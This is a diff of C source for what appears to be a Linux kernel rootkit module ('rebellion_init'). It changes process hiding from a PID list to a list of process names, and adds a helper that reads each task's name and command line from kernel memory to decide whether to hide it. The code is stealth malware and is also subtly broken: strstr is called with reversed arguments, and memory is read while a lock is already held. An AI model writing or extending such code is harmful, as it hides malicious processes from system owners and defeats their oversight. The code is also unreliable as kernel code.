@@ -48,53 +48,108 @@ void showModule(void) {
 }
 
 // Process hiding helper functions
-int add_hidden_pid(pid_t pid) {
+int add_hidden_process(const char *process_name) {
     int i;
     
-    // Check if PID is already hidden
-    for (i = 0; i < hidden_pid_count; i++) {
-        if (hidden_pids[i] == pid) {
+    // Check if process is already hidden
+    for (i = 0; i < hidden_process_count; i++) {
+        if (strncmp(hidden_processes[i], process_name, MAX_PROCESS_NAME_LEN) == 0) {
             return 0; // Already hidden
         }
     }
     
-    // Add PID if there's space
-    if (hidden_pid_count < HIDE_PID_LIST_SIZE) {
-        hidden_pids[hidden_pid_count] = pid;
-        hidden_pid_count++;
+    // Add process if there's space
+    if (hidden_process_count < HIDE_PROCESS_LIST_SIZE) {
+        strncpy(hidden_processes[hidden_process_count], process_name, MAX_PROCESS_NAME_LEN - 1);
+        hidden_processes[hidden_process_count][MAX_PROCESS_NAME_LEN - 1] = '\0';
+        hidden_process_count++;
         return 0;
     }
     
     return -1; // List is full
 }
 
-int remove_hidden_pid(pid_t pid) {
+int remove_hidden_process(const char *process_name) {
     int i, j;
     
-    for (i = 0; i < hidden_pid_count; i++) {
-        if (hidden_pids[i] == pid) {
-            // Shift remaining PIDs down
-            for (j = i; j < hidden_pid_count - 1; j++) {
-                hidden_pids[j] = hidden_pids[j + 1];
+    for (i = 0; i < hidden_process_count; i++) {
+        if (strncmp(hidden_processes[i], process_name, MAX_PROCESS_NAME_LEN) == 0) {
+            // Shift remaining processes down
+            for (j = i; j < hidden_process_count - 1; j++) {
+                strncpy(hidden_processes[j], hidden_processes[j + 1], MAX_PROCESS_NAME_LEN);
             }
-            hidden_pid_count--;
+            hidden_process_count--;
             return 0;
         }
     }
     
-    return -1; // PID not found
+    return -1; // Process not found
 }
 
-bool is_pid_hidden(pid_t pid) {
+bool is_process_hidden(const char *process_name) {
     int i;
     
-    for (i = 0; i < hidden_pid_count; i++) {
-        if (hidden_pids[i] == pid) {
+    for (i = 0; i < hidden_process_count; i++) {
+        if (strstr(hidden_processes[i], process_name) != NULL) {
             return true;
         }
     }
     
     return false;
+}
+
+bool is_pid_hidden_by_name(pid_t pid) {
+    struct task_struct *task;
+    struct mm_struct *mm;
+    char *cmdline, *p;
+    char comm_buf[TASK_COMM_LEN];
+    bool hidden = false;
+    
+    // Find task by PID
+    rcu_read_lock();
+    task = pid_task(find_vpid(pid), PIDTYPE_PID);
+    if (!task) {
+        rcu_read_unlock();
+        return false;
+    }
+    
+    // Check process name (comm)
+    get_task_comm(comm_buf, task);
+    if (is_process_hidden(comm_buf)) {
+        rcu_read_unlock();
+        return true;
+    }
+    
+    // Check command line
+    mm = get_task_mm(task);
+    rcu_read_unlock();
+    
+    if (mm) {
+        down_read(&mm->mmap_lock);
+        if (mm->arg_start && mm->arg_end) {
+            cmdline = kmalloc(mm->arg_end - mm->arg_start + 1, GFP_KERNEL);
+            if (cmdline) {
+                if (access_process_vm(task, mm->arg_start, cmdline, 
+                                    mm->arg_end - mm->arg_start, 0) > 0) {
+                    cmdline[mm->arg_end - mm->arg_start] = '\0';
+                    
+                    // Replace null bytes with spaces for easier matching
+                    for (p = cmdline; p < cmdline + (mm->arg_end - mm->arg_start); p++) {
+                        if (*p == '\0') *p = ' ';
+                    }
+                    
+                    if (is_process_hidden(cmdline)) {
+                        hidden = true;
+                    }
+                }
+                kfree(cmdline);
+            }
+        }
+        up_read(&mm->mmap_lock);
+        mmput(mm);
+    }
+    
+    return hidden;
 }
 
 static int __init rebellion_init(void) {
